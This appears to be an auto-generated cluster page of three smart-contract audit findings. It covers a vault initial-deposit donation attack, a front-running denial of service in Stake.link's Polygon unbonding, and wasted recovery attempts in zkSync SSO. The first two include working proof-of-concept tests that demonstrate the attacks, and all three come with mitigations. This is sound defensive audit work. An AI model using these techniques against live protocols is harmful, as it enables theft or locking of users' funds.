# Cluster -1004

**Rank:** #169  
**Count:** 74  

## Label
Failure to enforce transaction ordering, timing, and state consistency leads to unauthorized recovery, duplicate claims, and invalid parameter consumption, enabling front-running, delayed execution, and compromised account integrity.

## Cluster Information
- **Total Findings:** 74

## Examples

### Example 1

**Auto Label:** **Insufficient input validation and improper execution ordering lead to balance manipulation, pricing distortions, and economic exploitation of transaction sequences.**  

**Original Text Preview:**

## Severity

**Impact:** High, as the victim loses their funds

**Likelihood:** Low, as it comes at a cost for the attacker

## Description

The famous initial deposit attack is largely mitigated by the `+1` done in the asset/shares conversion. However, doing this attack can cause some strange behavior that could grief users (at high cost of the attacker) and leave the vault in a weird state:

Here's a PoC showing the impacts, can be added to `Deposit.t.sol`:

```solidity
    Vault vault;
    MockERC20 asset;

    address bob = makeAddr('bob');

    function setUp() public {
        asset = new MockERC20();
        vault = new Vault(100e18,100e18,asset);

        asset.mint(address(this), 10e18 + 9);
        asset.mint(bob,1e18);
    }

    function test_initialSupplyManipulation() public {
        // mint a small number of shares
        // (9 + 1 = 10) makes math simpler
        asset.approve(address(vault),9);
        vault.deposit(9, address(this));

        // do a large donation
        asset.transfer(address(vault), 10e18);

        // shares per assets is now manipulated
        assertEq(1e18+1,vault.convertToAssets(1));

        // victim stakes in vault
        vm.startPrank(bob);
        asset.approve(address(vault), 1e18);
        vault.deposit(1e18, bob);
        vm.stopPrank();

        // due to manipulation they receive 0 shares
        assertEq(0,vault.balanceOf(bob));

        // attacker redeems their shares
        vault.redeem(vault.balanceOf(address(this)), address(this), address(this));

        // even though the attacker loses 0.1 tokens
        assertEq(9.9e18 + 9,asset.balanceOf(address(this)));
        // the vicims tokens are lost and locked in the contract
        assertEq(1.1e18,asset.balanceOf(address(vault)));
    }
```

As you can see the attacker needs to pay `0.1e18` of assets for the attack. But they have effectively locked the victims `1e18` tokens in the contract.

Even though this is not profitable for the attacker it will leave the vault in a weird state and the victim will still have lost their tokens.

## Recommendations

Consider mitigating this with an initial deposit of a small amount. This is the most common and easy way to make sure this is not possible, as long as it is an substantial amount it will make this attack too costly.

---
### Example 2

**Auto Label:** Front-running and race conditions enable attackers to manipulate transaction ordering or dynamic values, leading to denial-of-service, price manipulation, or unauthorized fund withdrawals.  

**Original Text Preview:**

**Description:** The [unbond](https://github.com/stakedotlink/contracts/blob/1d3aa1ed6c2fb7920b3dc3d87ece5d1645e1a628/contracts/polygonStaking/PolygonStrategy.sol#L213-L263) function in `PolygonStrategy` is vulnerable to DoS when small reward amounts are used to cover the remaining amount to withdraw.

When [PolygonFundFlowController.unbondVaults](https://github.com/stakedotlink/contracts/blob/1d3aa1ed6c2fb7920b3dc3d87ece5d1645e1a628/contracts/polygonStaking/PolygonFundFlowController.sol#L121) is called it passes the amount to withdraw/unbond to `PolygonStrategy.unbond`:
```solidity
    function unbondVaults() external {
       ...
        uint256 toWithdraw = queuedWithdrawals - (queuedDeposits + validatorRemovalDeposits);
@>        strategy.unbond(toWithdraw);
        timeOfLastUnbond = uint64(block.timestamp);
    }
```

The `unbond` function loops through validators, using their rewards to cover the withdrawal amount. If rewards are insufficient, it unbonds from the validator's principal deposits.
```solidity
function unbond(uint256 _toUnbond) external onlyFundFlowController {
   ...
    if (rewards >= toUnbondRemaining) {
        // @audit withdrawRewards could be below the threshold from ValidatorShares
@>        vault.withdrawRewards();
        toUnbondRemaining = 0;
    } else {
        toUnbondRemaining -= rewards;
        uint256 vaultToUnbond = principalDeposits >= toUnbondRemaining
            ? toUnbondRemaining
            : principalDeposits;
@>        vault.unbond(vaultToUnbond);
        toUnbondRemaining -= vaultToUnbond;
        ++numVaultsUnbonded;
    }
   ...
}
```

A common, though infrequent, scenario occurs when iteration leaves `toUnbondRemaining` with a small amount for the next validator. This amount may be coverable by the validator's rewards, but if those rewards are below the threshold in the [ValidatorShares](https://etherscan.io/address/0x7e94d6cAbb20114b22a088d828772645f68CC67B#code#F1#L225) contract, the transaction will revert, causing a DoS in the `unbond` process.

**Example:**
1. Strategy has 3 validators.
2. Validator 3 has accumulated 0.9 tokens in rewards
3. The system needs to unbond 30.5 tokens in total
4. Validators 1 and 2 cover 30 tokens with their unbonds
5. Validator 3 is expected to cover the remaining 0.5 tokens with its 0.9 rewards(`withdrawRewards` is triggered)
6. The transaction reverts because 0.9 tokens is less than minAmount from ValidatorShares

The current logic also allows a malicious user to DoS the `unbond`  transaction due to the way rewards are calculated in the `unbound` function:

```solidity
uint256 deposits = vault.getTotalDeposits();
uint256 principalDeposits = vault.getPrincipalDeposits();
uint256 rewards = deposits - principalDeposits;
```
The `getTotalDeposits` accounts for the current token balance in the `PolygonVault` contract.  If the `toUnbondRemaining` and validator's rewards are less than vault's minimum rewards, an attacker can front-run the transaction and cause `unbond` to revert given the current scenario:

1. Attacker sent dust amount to the `PolygonVault`. Enough to cover `toUnbondRemaining` but < 1e18 (minimum rewards).
2. `rewards = deposits - principalDeposits` >= `toUnbondRemaining`.
3. Vault will call `withdrawRewards` but current claim amount to be withdrawn < `1e18`(trigger for the revert in [ValidatorShares](https://etherscan.io/address/0x7e94d6cAbb20114b22a088d828772645f68CC67B#code#F1#L225))
4. Transaction reverts.

**Impact:** DoS in the unbonding process when small rewards (< 1e18) are needed to complete withdrawals, blocking the protocol's withdrawal flow.

**Proof of Concept:**
1. First adjust the `PolygonValidatorShareMock` to reflect the same behavior as `ValidatorShares` by adding a minimum amount requirement when withdrawing rewards.
```diff
// PolygonValidatorShareMock
   function withdrawRewardsPOL() external {
        uint256 rewards = liquidRewards[msg.sender];
        if (rewards == 0) revert NoRewards();
+        require(rewards >= 1e18, "Too small rewards amount");

        delete liquidRewards[msg.sender];
        stakeManager.withdraw(msg.sender, rewards);
    }
```

2. Paste the following test in `polygon-fund-flow-controller.test.ts` and `run npx hardhat test test/polygonStaking/polygon-fund-flow-controller.test.ts`:
```solidity
describe.only('DoS', async () => {
    it('will revert when withdrawRewards < 1e18', async () => {
      const { token, strategy, vaults, fundFlowController, withdrawalPool, validatorShare, validatorShare2, validatorShare3 } =
      await loadFixture(deployFixture)
      console.log("will print some stuff")

      // validator funds: [10, 20, 30]
      await withdrawalPool.setTotalQueuedWithdrawals(toEther(970.5));
      assert.equal(await fundFlowController.shouldUnbondVaults(), true);

      // 1. Pre-condition: validator acumulated dust rewards since last unbonding.
      await validatorShare3.addReward(vaults[2].target, toEther(0.9));

      // expect that vault 2 has rewards
      assert.equal(await vaults[2].getRewards(), toEther(0.9));

      // 2. Unbond:
      // Validator A will cover 10 with unbond
      // Validator B will cover 20 with unbond
      // Validator C will cover the remaining 0.5 with his 0.9 rewards.
      await expect(fundFlowController.unbondVaults()).to.be.revertedWith("Too small rewards amount");
    })
  })
```
Output:
```javascript
PolygonFundFlowController
    DoS
      ✔ will revert when withdrawRewards < 1e18 (800ms)

  1 passing (800ms)
```

**Recommended Mitigation:** In the `PolygonStrategy.unbond` check if the **actual** rewards that can be withdrawn from the `ValidatorShares` is greater than the min amount for claim(1e18) before calling `withdrawRewards`.
```diff
-if (rewards >= toUnbondRemaining) {
-    vault.withdrawRewards();
-    toUnbondRemaining = 0;
+if (rewards >= toUnbondRemaining && vault.getRewards() >= vault.minAmount()) {
+    vault.withdrawRewards();
+    toUnbondRemaining = 0;
} else {
+    if (toUnbondRemaining > rewards) {
+        toUnbondRemaining -= rewards;
+    }
-    toUnbondRemaining -= rewards;
     uint256 vaultToUnbond = principalDeposits >= toUnbondRemaining
         ? toUnbondRemaining
         : principalDeposits;
```


**Stake.Link:** Resolved in [PR 151](https://github.com/stakedotlink/contracts/pull/151/commits/fec5777db57e3649b27f8cff7ab2fd34b3fb9857)

**Cyfrin:** Resolved.

---
### Example 3

**Auto Label:** Failure to enforce transaction ordering, timing, and state consistency leads to unauthorized recovery, duplicate claims, and invalid parameter consumption, enabling front-running, delayed execution, and compromised account integrity.  

**Original Text Preview:**

The `OidcRecoveryValidator` contract introduces a mechanism for account recovery, culminating in the addition of a new `publicKey` to the `WebAuthValidator` contract. Initially, an account is [linked to an `oidcDigest`](https://github.com/matter-labs/zksync-sso-clave-contracts/blob/ed21d09add8da99d9c82d0f7c30659625c6636e6/src/validators/OidcRecoveryValidator.sol#L163), and upon the need for recovery, a [submission process is initiated](https://github.com/matter-labs/zksync-sso-clave-contracts/blob/ed21d09add8da99d9c82d0f7c30659625c6636e6/src/validators/OidcRecoveryValidator.sol#L201) that verifies proofs against the `oidcDigest`. If verification is successful, any participant can execute a transaction to incorporate the new `publicKey` into the [`WebAuthValidator`](https://github.com/matter-labs/zksync-sso-clave-contracts/blob/ed21d09add8da99d9c82d0f7c30659625c6636e6/src/validators/WebAuthValidator.sol#L94).

However, a problem arises when the `credentialId` and `originDomain` parameters do not meet some of the requirements in the `WebAuthValidator` contract, in which the call [will not revert but will instead return a `false` output](https://github.com/matter-labs/zksync-sso-clave-contracts/blob/ed21d09add8da99d9c82d0f7c30659625c6636e6/src/validators/WebAuthValidator.sol#L100-L111). In such a scenario, the call will be considered successful without reversion, regardless of the non-inclusion of the `publicKey`. As a result, the [recovery attempt will be consumed](https://github.com/matter-labs/zksync-sso-clave-contracts/blob/ed21d09add8da99d9c82d0f7c30659625c6636e6/src/validators/OidcRecoveryValidator.sol#L282-L283) and a new recovery will be needed.

This flaw not only risks the unnecessary consumption of recovery attempts due to parameter mismatches but also exposes the problem of users who, knowledgeable of the user's `publicKey`, could deliberately consume the recovery attempt by submitting transactions with arbitrary, incorrect parameters alongside the `publicKey`, that will not pass the `WebAuthValidator` contract requirements.

To mitigate the risk of wasted recovery attempts and protect against potential misuse, consider binding the `credentialId` and `originDomain` arguments within the [zkProof](https://github.com/matter-labs/zksync-sso-clave-contracts/blob/ed21d09add8da99d9c82d0f7c30659625c6636e6/src/validators/OidcRecoveryValidator.sol#L235) and storing this binding in the contract for subsequent validation in the `validateTransaction` function. This change ensures that these parameters remain immutable during the `validateTransaction` call, preventing unauthorized or unintended consumption of recovery attempts.

***Update:** Resolved in [pull request #426](https://github.com/matter-labs/zksync-sso-clave-contracts/pull/426) at commit [35ff79c](https://github.com/matter-labs/zksync-sso-clave-contracts/pull/426/commits/35ff79ced9f7ae5e90232913dc17c9213e7b2bb5).*

---
